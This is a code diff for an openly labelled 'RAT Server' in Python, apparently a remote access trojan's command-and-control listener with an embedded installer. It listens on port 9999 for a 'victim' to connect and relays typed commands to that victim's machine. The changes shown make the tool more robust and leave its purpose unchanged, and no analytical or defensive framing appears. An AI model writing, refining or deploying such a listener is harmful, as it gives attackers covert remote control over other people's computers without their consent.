@@ -12,9 +12,9 @@ LISTEN_IP = '0.0.0.0'
 PORT = 9999
 
 def main():
-    print("--- RAT Server Started ---")
+    print("--- RAT Server Started (Robust Version) ---")
     print("Waiting for victim to connect...")
-    print("NOTE: If connected, the client terminal will now echo commands you type here.")
+    print("NOTE: This server handles silent commands correctly and will always re-prompt.")
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -25,6 +25,7 @@ def main():
         print(f"[*] Listening on {LISTEN_IP}:{PORT}")
     except Exception as e:
         print(f"[!] Failed to bind: {e}")
+        print("[!] Ensure no other program is using port 9999 and check firewall settings.")
         sys.exit(1)
 
     print("[*] Waiting for connection...")
@@ -35,8 +36,7 @@ def main():
 
     while True:
         try:
-            # Ensure the prompt is always printed clearly
-            cmd = input("# Command: ")
+            cmd = input("\\n# Command: ")
             
             if cmd.lower() == 'exit':
                 print("[*] Sending exit command...")
@@ -46,8 +46,6 @@ def main():
             print(f"[*] Sending command: {cmd}")
             client.send(cmd.encode())
             
-            # Wait for response with a timeout mechanism handled by the client sending data
-            # If the client sends the "Success" message, this will receive it.
             data = client.recv(4096)
             
             if not data:
@@ -62,7 +60,7 @@ def main():
                 print("[!] Received empty response. Something is wrong.")
                 
         except KeyboardInterrupt:
-            print("[*] Interrupted by user. Closing connection.")
+            print("\\n[*] Interrupted by user. Closing connection.")
             break
         except Exception as e:
             print(f"[!] Error occurred: {e}")
@@ -81,7 +79,7 @@ if __name__ == "__main__":
 """
 
 def main():
-    print("[*] RAT Server Installer")
+    print("[*] RAT Server Installer (Robust Version)")
     print("[*] Checking for Python...")
     
     if not shutil.which("python3") and not shutil.which("python"):
